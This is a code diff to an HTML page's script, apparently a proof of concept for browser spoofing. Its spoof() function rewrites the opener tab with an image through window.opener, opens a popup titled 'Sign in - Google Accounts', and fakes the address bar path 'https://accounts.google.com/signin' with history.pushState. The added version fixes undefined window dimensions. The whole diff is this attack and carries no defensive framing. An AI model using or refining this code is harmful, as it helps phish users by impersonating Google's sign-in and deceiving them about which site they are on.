@@ -12,94 +12,73 @@
       }
     </style>
 
-    <script>
-      function spoof() {
-        const openerHTML = `
-        <html>
-            <head>
-                <style>
-                    body {
-                        margin: 0;
-                        padding: 0;
-                        overflow: hidden;
-                    }
-                    #content {
-                        width: 100%;
-                        height: 100%;
-                        display: block;
-                    }
-                </style>
-            </head>
-            <body>
-                <img id="content" src="spoof.png">
-            </body>
-        </html>
-    `;
+<script>
+function spoof() {
 
-        const popupHTML = `
-        <html>
-            <head>
-                <title>Sign in - Google Accounts</title>
-                <style>
-                    body {
-                        margin: 0;
-                        padding: 0;
-                        overflow: hidden;
-                    }
-                    #content {
-                        width: 100%;
-                        height: 100%;
-                        display: block;
-                    }
-                </style>
-            </head>
-            <body>
-                <img id="content" src="sign.png">
-            </body>
-        </html>
-    `;
+  const openerHTML = `
+  <html>
+    <head>
+      <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+        #content { width: 100%; height: 100%; display: block; }
+      </style>
+    </head>
+    <body>
+      <img id="content" src="spoof.png">
+    </body>
+  </html>`;
 
-        // ---- FULLSCREEN FALLBACK ----
-        if (
-          window.opener &&
-          window.opener.document.documentElement.requestFullscreen
-        ) {
-          window.opener.document.documentElement
-            .requestFullscreen()
-            .catch(() => {});
-        }
+  const popupHTML = `
+  <html>
+    <head>
+      <title>Sign in - Google Accounts</title>
+      <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+        #content { width: 100%; height: 100%; display: block; }
+      </style>
+    </head>
+    <body>
+      <img id="content" src="sign.png">
+    </body>
+  </html>`;
 
-        // ---- SPOOF MAIN WINDOW ----
-        if (window.opener) {
-          window.opener.document.open();
-          window.opener.document.write(openerHTML);
-          window.opener.document.close();
-        }
+  // FIX: define window size
+  const width = 500, height = 460;
+  const left = (screen.width / 2) - (width / 2);
+  const top = 0;
 
-        // ---- OPEN POPUP ----
-        const win = window.open(
-          "about:blank",
-          "_blank",
-          `width=${width},height=${height},top=0,left=${left}`
-        );
-        
-        setTimeout(() => {
-          try {
-            win.document.open();
-            win.document.write(popupHTML);
-            win.document.close();
-        
-            // Fake URL bar injection (opsional)
-            win.history.pushState({}, "", "https://accounts.google.com/signin"); 
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
+  // ---- SPOOF MAIN WINDOW ----
+  if (window.opener) {
+    window.opener.document.open();
+    window.opener.document.write(openerHTML);
+    window.opener.document.close();
+  }
 
-        // ---- CLOSE CURRENT WINDOW ----
-        window.close();
-      }
-    </script>
+  // ---- OPEN POPUP (MUST BE about:blank) ----
+  const win = window.open(
+    "about:blank",
+    "_blank",
+    `width=${width},height=${height},top=${top},left=${left}`
+  );
+
+  // ---- Inject HTML ----
+  setTimeout(() => {
+    try {
+      win.document.open();
+      win.document.write(popupHTML);
+      win.document.close();
+
+      // Fake URL
+      win.history.pushState({}, "", "https://accounts.google.com/signin");
+    } catch (e) {
+      console.warn("Blocked by browser protections:", e);
+    }
+  }, 50);
+
+  window.close();
+}
+</script>
+
   </head>
 
   <body>
